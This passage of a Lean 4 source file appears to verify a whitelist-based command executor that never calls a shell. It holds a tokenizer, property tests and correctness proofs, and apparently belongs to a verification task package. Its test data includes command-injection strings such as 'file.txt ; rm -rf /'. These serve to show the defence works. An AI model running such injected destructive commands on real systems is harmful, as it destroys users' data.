  | .ok _ => true
  | .error e => e == "No closing quotation" || e == "No escaped character"

/-- Executable form of `Post_prop`. -/
def postCheck (exec : Executor) (cmdName args : String) : Bool :=
  unknownCommandCheck exec cmdName args && invalidArgsCheck exec cmdName args &&
  emptyArgsCheck exec cmdName args && execResultCheck exec cmdName args &&
  argvStructureCheck cmdName args && execOnlyWhitelistedCheck exec cmdName args &&
  singleProgramCheck exec cmdName args &&
  errorOrStdoutCheck exec cmdName args && metacharLiteralCheck args && shlexErrorCheck args

/-- A second operating-system model: every program succeeds and echoes its argv. -/
def echoExec : Executor := fun argv => .ok (String.intercalate " " argv)

/-- A third model: every execution fails with a non-zero exit status. -/
def failExec : Executor := fun argv => .failed (String.intercalate " " ("fail" :: argv))

/-- Tricky argument strings (quoting, escapes, whitespace, malformed input). -/
def trickyArgs : List String :=
  ["", "   ", "\t\n", ".", "/tmp", "''", "\"\"", "a'b c'd", "'a b' \"c d\" e\\ f",
   "\"a\\\"b\\\\c\\nd\"", "x\\", "'unterminated", "\"unterminated", "file.txt ; rm -rf /",
   "a;b|c&&d$(e)`f`", "--", "-rf /", "\x0c"]

-- unknown_command_prop
#eval Plausible.Testable.check (∀ cmd args : String, unknownCommandCheck mockExec cmd args = true)
#eval Plausible.Testable.check (∀ cmd args : String,
  lookupCommand cmd = none → executeCommandSafe mockExec cmd args = "Error: Unknown command")
-- invalid_args_prop
#eval Plausible.Testable.check (∀ args : String, invalidArgsCheck mockExec "list" args = true)
#eval Plausible.Testable.check (∀ cmd args : String, invalidArgsCheck echoExec cmd args = true)
-- empty_args_prop
#eval Plausible.Testable.check (∀ args : String, emptyArgsCheck mockExec "count" args = true)
#eval Plausible.Testable.check (∀ cmd args : String, emptyArgsCheck failExec cmd args = true)
-- exec_success_prop / exec_failure_prop
#eval Plausible.Testable.check (∀ cmd args : String, execResultCheck echoExec cmd args = true)
#eval Plausible.Testable.check (∀ cmd args : String, execResultCheck failExec cmd args = true)
#eval Plausible.Testable.check (∀ args : String, execResultCheck mockExec "list" args = true)
-- argv_structure_prop
#eval Plausible.Testable.check (∀ args : String, argvStructureCheck "list" args = true)
#eval Plausible.Testable.check (∀ args : String, argvStructureCheck "search" args = true)
#eval Plausible.Testable.check (∀ cmd args : String, argvStructureCheck cmd args = true)
-- exec_only_whitelisted_prop
#eval Plausible.Testable.check (∀ cmd args : String, execOnlyWhitelistedCheck echoExec cmd args = true)
#eval Plausible.Testable.check (∀ args : String, execOnlyWhitelistedCheck echoExec "list" args = true)
-- single_program_prop
#eval Plausible.Testable.check (∀ cmd args : String, singleProgramCheck echoExec cmd args = true)
#eval Plausible.Testable.check (∀ args : String, singleProgramCheck echoExec "count" args = true)
-- error_or_stdout_prop
#eval Plausible.Testable.check (∀ cmd args : String, errorOrStdoutCheck mockExec cmd args = true)
#eval Plausible.Testable.check (∀ args : String, errorOrStdoutCheck failExec "count" args = true)
-- metachar_literal_prop
#eval Plausible.Testable.check (∀ s : String, metacharLiteralCheck s = true)
/-- Random strings with quotes/backslashes removed: every sample is admissible. -/
def plainOf (s : String) : String := String.mk (s.toList.filter fun c => !isSpecial c)
#eval Plausible.Testable.check
  (∀ s : String, shlexSplit (plainOf s) = .ok (wsSplit (plainOf s)))
-- shlex_error_prop
#eval Plausible.Testable.check (∀ s : String, shlexErrorCheck s = true)
-- Post_prop
#eval Plausible.Testable.check (∀ cmd args : String, postCheck mockExec cmd args = true)
#eval Plausible.Testable.check (∀ args : String, postCheck mockExec "list" args = true)
#eval Plausible.Testable.check (∀ args : String, postCheck echoExec "count" args = true)
#eval Plausible.Testable.check (∀ args : String, postCheck failExec "search" args = true)

-- bounded / exhaustive checks on the injection vectors and tricky strings
example : (trickyArgs.all fun a => postCheck mockExec "list" a && postCheck echoExec "count" a &&
    postCheck failExec "search" a && postCheck mockExec a ".") = true := by native_decide
example : (attackVectors.all fun a => postCheck mockExec "list" a && postCheck echoExec "list" a &&
    postCheck mockExec a "." && unknownCommandCheck mockExec a ".") = true := by native_decide
example : (trickyArgs.all fun a => shlexErrorCheck a && metacharLiteralCheck a) = true := by
  native_decide

/-! ## Correctness theorem: `Pre → Post` -/

theorem executeCommandSafe_correct (exec : Executor) (cmdName args : String)
    (_hpre : Pre cmdName args) :
    Post_prop exec cmdName args (executeCommandSafe exec cmdName args) :=
  ⟨unknown_command_thm exec cmdName args, invalid_args_thm exec cmdName args,
   empty_args_thm exec cmdName args, exec_success_thm exec cmdName args,
   exec_failure_thm exec cmdName args, argv_structure_thm cmdName args,
   exec_only_whitelisted_thm exec cmdName args, single_program_thm exec cmdName args,
   error_or_stdout_thm exec cmdName args,
   metachar_literal_thm args, shlex_error_thm args⟩

/-! ## Imperative implementation (`Id.run do` with mutable state) -/

/-- Mutable state of the imperative tokenizer. -/
structure LexState where
  mode : LexMode
  inTok : Bool
  cur : List Char
  acc : List String
  deriving Repr

/-- One step of the `shlex` state machine on the next character. -/
def lexStep : LexState → Char → LexState
  | ⟨.normal, inTok, cur, acc⟩, c =>
      if isWs c then ⟨.normal, false, [], if inTok then String.mk cur.reverse :: acc else acc⟩
      else if c = '\'' then ⟨.single, true, cur, acc⟩
      else if c = '"' then ⟨.double, true, cur, acc⟩
      else if c = '\\' then ⟨.escNormal, true, cur, acc⟩
      else ⟨.normal, true, c :: cur, acc⟩
  | ⟨.single, _, cur, acc⟩, c =>
      if c = '\'' then ⟨.normal, true, cur, acc⟩ else ⟨.single, true, c :: cur, acc⟩
  | ⟨.double, _, cur, acc⟩, c =>
      if c = '"' then ⟨.normal, true, cur, acc⟩
      else if c = '\\' then ⟨.escDouble, true, cur, acc⟩
      else ⟨.double, true, c :: cur, acc⟩
  | ⟨.escNormal, _, cur, acc⟩, c => ⟨.normal, true, c :: cur, acc⟩
  | ⟨.escDouble, _, cur, acc⟩, c =>
      if c = '"' ∨ c = '\\' then ⟨.double, true, c :: cur, acc⟩
      else ⟨.double, true, c :: '\\' :: cur, acc⟩

/-- End of input: emit the pending token or report an unterminated construct. -/
def lexFinish : LexState → Except String (List String)
  | ⟨.normal, inTok, cur, acc⟩ =>
      .ok (if inTok then (String.mk cur.reverse :: acc).reverse else acc.reverse)
  | ⟨.single, _, _, _⟩ | ⟨.double, _, _, _⟩ => .error "No closing quotation"
  | ⟨.escNormal, _, _, _⟩ | ⟨.escDouble, _, _, _⟩ => .error "No escaped character"

/-- Imperative `shlex.split`: a `for` loop over the characters with a mutable state. -/
def shlexSplitImp (s : String) : Except String (List String) := Id.run do
  let mut st : LexState := ⟨.normal, false, [], []⟩
  for c in s.toList do
    st := lexStep st c
  return lexFinish st

/-- Imperative `execute_command_safe`: mutable `argv`, early returns on errors, and one
`execve` of the final argv (never a shell). -/
def executeCommandSafeImp (exec : Executor) (cmdName : String) (args : String := "") :
    String := Id.run do
  let mut argv : List String := []
  -- 1. whitelist validation
  match lookupCommand cmdName with
  | none => return "Error: Unknown command"
  | some base => argv := base
  -- 2. safe tokenization (quotes only, no shell metacharacters), appended after `--`
  if !stripIsEmpty args then
    match shlexSplitImp args with
    | .error e => return "Error: Invalid arguments - " ++ e
    | .ok userArgs => argv := argv ++ userArgs
  -- 3. one execve of `argv`, no shell
  match exec argv with
  | .ok stdout => return stdout
  | .failed stderr =>
      return "Error: " ++ (if stderr.isEmpty then "Command failed" else pyStrip stderr)
  | .notFound => return "Error: Command not found"

/-! ## Imperative tests -/

example : shlexSplitImp "file.txt ; rm -rf /" = .ok ["file.txt", ";", "rm", "-rf", "/"] := by
  native_decide
example : shlexSplitImp "a 'b c' \"d e\" f\\ g" = .ok ["a", "b c", "d e", "f g"] := by native_decide
example : shlexSplitImp "''" = .ok [""] := by native_decide
example : shlexSplitImp "'abc" = .error "No closing quotation" := by native_decide
example : shlexSplitImp "abc\\" = .error "No escaped character" := by native_decide
example : executeCommandSafeImp mockExec "list" "." = "file1.txt\nfile2.txt\n" := by native_decide
example : executeCommandSafeImp mockExec "count" "/tmp/t.txt" = "3 /tmp/t.txt\n" := by native_decide
example : executeCommandSafeImp mockExec "list" "; rm -rf /" =
    "Error: ls: cannot access ';': No such file or directory" := by native_decide
example : executeCommandSafeImp mockExec "evil" "args" = "Error: Unknown command" := by native_decide
example : executeCommandSafeImp mockExec "list" "" = "file1.txt\nfile2.txt\n" := by native_decide
example : executeCommandSafeImp mockExec "list" "'abc" =
    "Error: Invalid arguments - No closing quotation" := by native_decide
example : (attackVectors.all fun a =>
    executeCommandSafeImp mockExec "list" a == executeCommandSafe mockExec "list" a &&
    executeCommandSafeImp mockExec a "." == "Error: Unknown command") = true := by native_decide
example : (trickyArgs.all fun a =>
    executeCommandSafeImp echoExec "search" a == executeCommandSafe echoExec "search" a &&
    shlexSplitImp a == shlexSplit a) = true := by native_decide

#eval executeCommandSafeImp mockExec "list" "; rm -rf /"
#eval Plausible.Testable.check (∀ s : String, shlexSplitImp s = shlexSplit s)
#eval Plausible.Testable.check
  (∀ cmd args : String, executeCommandSafeImp mockExec cmd args = executeCommandSafe mockExec cmd args)
#eval Plausible.Testable.check
  (∀ args : String, executeCommandSafeImp echoExec "list" args = executeCommandSafe echoExec "list" args)
#eval Plausible.Testable.check
  (∀ args : String, executeCommandSafeImp failExec "count" args = executeCommandSafe failExec "count" args)

/-! ## Equivalence theorems: functional = imperative -/

/-- The recursive tokenizer is the left fold of the imperative step function. -/
theorem splitAux_eq_foldl (cs : List Char) (mode : LexMode) (inTok : Bool) (cur : List Char)
    (acc : List String) :
    splitAux cs mode inTok cur acc = lexFinish (cs.foldl lexStep ⟨mode, inTok, cur, acc⟩) := by
  induction cs generalizing mode inTok cur acc with
  | nil => cases mode <;> rfl
  | cons c cs ih =>
    cases mode <;> simp only [splitAux, List.foldl_cons, lexStep] <;> (try split_ifs) <;>
      exact ih _ _ _ _

theorem shlexSplitImp_eq (s : String) : shlexSplitImp s = shlexSplit s := by
  unfold shlexSplitImp shlexSplit
  rw [splitAux_eq_foldl]
  simp

theorem executeCommandSafeImp_eq (exec : Executor) (cmdName args : String) :
    executeCommandSafeImp exec cmdName args = executeCommandSafe exec cmdName args := by
  unfold executeCommandSafeImp executeCommandSafe buildArgv
  cases lookupCommand cmdName with
  | none => rfl
  | some base =>
    cases hs : stripIsEmpty args
    · rw [shlexSplitImp_eq]
      cases shlexSplit args with
      | error e => rfl
      | ok user => cases hx : exec (base ++ user) <;> simp [hx, interpretResult]
    · cases hx : exec base <;> simp [hx, interpretResult]

end «1_no_command_injection_safe»
end Agent
